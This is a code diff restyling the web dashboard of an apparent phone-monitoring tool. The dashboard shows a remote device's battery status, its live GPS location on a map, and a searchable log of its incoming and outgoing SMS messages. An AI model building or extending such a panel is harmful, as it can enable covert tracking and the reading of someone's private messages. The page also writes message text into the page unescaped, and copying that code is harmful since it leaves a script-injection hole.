@@ -1,97 +1,84 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Management Console</title>
+    <title>Device Management Console</title>
     <script src="/socket.io/socket.io.js"></script>
     <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
     <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
     
     <style>
-        /* NORMAL MODERN FONT */
-        :root { 
-            --bg: #f8f9fa; --sidebar: #ffffff; --text: #333; --accent: #007bff; 
-        }
-        body { 
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial, sans-serif; 
-            margin: 0; display: flex; background: var(--bg); color: var(--text); 
-        }
+        /* NORMAL PROFESSIONAL FONT */
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; margin: 0; display: flex; background: #f4f7f6; color: #333; }
         
-        .sidebar { width: 260px; background: var(--sidebar); height: 100vh; position: fixed; border-right: 1px solid #dee2e6; }
-        .nav-item { padding: 15px 25px; cursor: pointer; border-bottom: 1px solid #f1f1f1; color: #555; transition: 0.2s; }
-        .nav-item:hover, .active { background: #f8f9fa; color: var(--accent); font-weight: 600; }
+        /* SIDEBAR */
+        .sidebar { width: 250px; background: #2c3e50; color: white; height: 100vh; position: fixed; }
+        .nav-item { padding: 15px 20px; cursor: pointer; border-bottom: 1px solid #34495e; transition: 0.3s; }
+        .nav-item:hover, .active { background: #1abc9c; color: white; }
 
-        /* FIXED HEADER */
+        /* FIXED GPS HEADER */
         .fixed-header {
-            position: fixed; top: 0; left: 260px; right: 0; height: 80px;
-            background: #fff; border-bottom: 1px solid #dee2e6;
+            position: fixed; top: 0; left: 250px; right: 0; height: 90px;
+            background: white; border-bottom: 1px solid #ddd;
             display: flex; justify-content: space-between; align-items: center;
             padding: 0 30px; z-index: 1000;
         }
-        .gps-box { font-size: 0.9rem; color: #666; }
-        .gps-address { color: #222; font-weight: bold; margin-bottom: 3px; }
+        .gps-text { font-size: 0.9rem; color: #555; max-width: 60%; }
+        .gps-address { font-weight: bold; color: #2c3e50; display: block; margin-bottom: 4px; }
 
-        .main-content { margin-left: 260px; padding-top: 80px; flex: 1; }
-        .view { display: none; padding: 30px; }
+        /* CONTENT */
+        .main-content { margin-left: 250px; padding-top: 100px; flex: 1; }
+        .view { display: none; padding: 20px; }
         .view.active { display: block; }
 
-        /* SEARCH BOX */
-        .search-container { margin-bottom: 20px; }
-        #smsSearch {
-            width: 100%; padding: 12px; border: 1px solid #ddd; border-radius: 6px;
-            font-size: 1rem; outline: none;
-        }
+        /* SEARCH & TABLE */
+        #smsSearch { width: 100%; padding: 12px; margin-bottom: 15px; border: 1px solid #ccc; border-radius: 5px; box-sizing: border-box; }
+        table { width: 100%; border-collapse: collapse; background: white; border-radius: 8px; overflow: hidden; box-shadow: 0 2px 5px rgba(0,0,0,0.05); }
+        th { background: #f8f9fa; padding: 12px; text-align: left; border-bottom: 2px solid #eee; font-size: 0.85rem; color: #777; }
+        td { padding: 12px; border-bottom: 1px solid #eee; font-size: 0.9rem; }
+        .Incoming { color: #27ae60; font-weight: bold; }
+        .Outgoing { color: #2980b9; font-weight: bold; }
 
-        /* NORMAL TABLE */
-        table { width: 100%; border-collapse: collapse; background: #fff; border-radius: 8px; overflow: hidden; box-shadow: 0 1px 3px rgba(0,0,0,0.1); }
-        th { background: #f1f3f5; color: #495057; padding: 15px; text-align: left; font-weight: 600; border-bottom: 2px solid #dee2e6; }
-        td { padding: 15px; border-bottom: 1px solid #eee; vertical-align: top; }
-        
-        .Incoming { color: #28a745; font-weight: bold; }
-        .Outgoing { color: #007bff; font-weight: bold; }
-
-        #map { width: 100%; height: 450px; border-radius: 8px; border: 1px solid #ddd; }
+        #map { width: 100%; height: 500px; border-radius: 10px; border: 1px solid #ddd; }
     </style>
 </head>
 <body>
 
 <div class="sidebar">
-    <div style="padding:25px; font-size:1.2rem; font-weight:bold; color:var(--accent); border-bottom:1px solid #eee;">Admin Panel</div>
-    <div class="nav-item active" onclick="showView('dash')">Dashboard</div>
-    <div class="nav-item" onclick="showView('sms')">Communication Logs</div>
-    <div class="nav-item" onclick="showView('map-view')">Live Location</div>
+    <div style="padding: 20px; font-weight: bold; font-size: 1.2rem; border-bottom: 1px solid #34495e;">Control Center</div>
+    <div class="nav-item active" onclick="showView('dash')">📊 Dashboard</div>
+    <div class="nav-item" onclick="showView('sms')">✉️ Communication Logs</div>
+    <div class="nav-item" onclick="showView('map-view')">📍 Live Map</div>
 </div>
 
 <div class="fixed-header">
-    <div class="gps-box">
-        <div id="gps-addr" class="gps-address">Waiting for location update...</div>
-        <div>Accuracy: <span id="gps-acc">--</span>m | Updated: <span id="gps-time">--</span></div>
+    <div class="gps-text">
+        <span id="gps-addr" class="gps-address">Waiting for GPS fix...</span>
+        Accuracy: <span id="gps-acc">--</span>m | Last Update: <span id="gps-time">--</span>
     </div>
-    <div style="display:flex; align-items:center; gap:20px;">
-        <div id="status-tag" style="font-size:0.8rem; font-weight:bold; color:red;">● OFFLINE</div>
-        <div style="font-size:1.4rem;"><span id="pct">--</span>%</div>
-        <div style="position:relative; font-size:1.8rem;">
-            🔋 <span id="bolt" style="position:absolute; left:5px; color:#ffc107; display:none; text-shadow:1px 1px 2px #000;">⚡</span>
+    <div style="display:flex; align-items:center; gap:15px;">
+        <div id="status-dot" style="color:red; font-size:0.8rem;">● OFFLINE</div>
+        <div style="font-size:1.5rem;"><span id="pct">--</span>%</div>
+        <div style="position:relative; font-size:2rem;">
+            🔋 <span id="bolt" style="position:absolute; left:6px; color:#f1c40f; display:none;">⚡</span>
         </div>
     </div>
 </div>
 
 <div class="main-content">
     <div id="dash" class="view active">
-        <h2>System Summary</h2>
-        <p>All background services are running.</p>
+        <h2>System Status</h2>
+        <p>Telemetry link is established.</p>
     </div>
 
     <div id="sms" class="view">
-        <div class="search-container">
-            <input type="text" id="smsSearch" placeholder="Search by number or message content..." onkeyup="filterSMS()">
-        </div>
+        <input type="text" id="smsSearch" placeholder="Search by number or message content..." onkeyup="filterSMS()">
         <table>
             <thead>
                 <tr>
                     <th>Type</th>
-                    <th>From/To Number</th>
+                    <th>Number</th>
                     <th>Message</th>
-                    <th>Timestamp</th>
+                    <th>Date/Time</th>
                 </tr>
             </thead>
             <tbody id="sms-table"></tbody>
@@ -99,7 +86,6 @@
     </div>
 
     <div id="map-view" class="view">
-        <h2>Live Tracker</h2>
         <div id="map"></div>
     </div>
 </div>
@@ -112,20 +98,23 @@
         document.querySelectorAll('.view').forEach(v => v.classList.remove('active'));
         document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active'));
         document.getElementById(id).classList.add('active');
-        if(id === 'map-view') { setTimeout(() => { if(!map) initMap(); map.invalidateSize(); }, 200); }
+        if(id === 'map-view') {
+            setTimeout(() => { 
+                if(!map) {
+                    map = L.map('map').setView([0, 0], 2);
+                    L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(map);
+                    marker = L.marker([0, 0]).addTo(map);
+                }
+                map.invalidateSize(); 
+            }, 200);
+        }
         if(id === 'sms') socket.emit('get-sms-request');
-    }
-
-    function initMap() {
-        map = L.map('map').setView([0, 0], 2);
-        L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(map);
-        marker = L.marker([0, 0]).addTo(map);
     }
 
     socket.on('ui-battery', (data) => {
         document.getElementById('pct').innerText = data.percent;
-        document.getElementById('status-tag').innerText = "● ONLINE";
-        document.getElementById('status-tag').style.color = "green";
+        document.getElementById('status-dot').style.color = "green";
+        document.getElementById('status-dot').innerText = "● ONLINE";
         document.getElementById('bolt').style.display = data.charging ? "block" : "none";
     });
 
@@ -133,7 +122,7 @@
         document.getElementById('gps-addr').innerText = data.address;
         document.getElementById('gps-acc').innerText = data.accuracy;
         document.getElementById('gps-time').innerText = data.time;
-        if (map && data.lat) {
+        if(map && data.lat) {
             const pos = [data.lat, data.lng];
             map.setView(pos, 16);
             marker.setLatLng(pos);
@@ -141,20 +130,20 @@
     });
 
     socket.on('ui-sms-display', (data) => {
-        allSMS = data; // Store for searching
+        allSMS = data;
         renderSMS(allSMS);
     });
 
     function renderSMS(data) {
-        const html = data.map(m => `
+        const body = document.getElementById('sms-table');
+        body.innerHTML = data.map(m => `
             <tr>
                 <td class="${m.type}">${m.type}</td>
                 <td><b>${m.address}</b></td>
                 <td>${m.body}</td>
-                <td style="color:#999; font-size:0.85rem;">${new Date(m.date).toLocaleString()}</td>
+                <td style="color:#999; font-size:0.8rem;">${new Date(m.date).toLocaleString()}</td>
             </tr>
         `).join('');
-        document.getElementById('sms-table').innerHTML = html;
     }
 
     function filterSMS() {
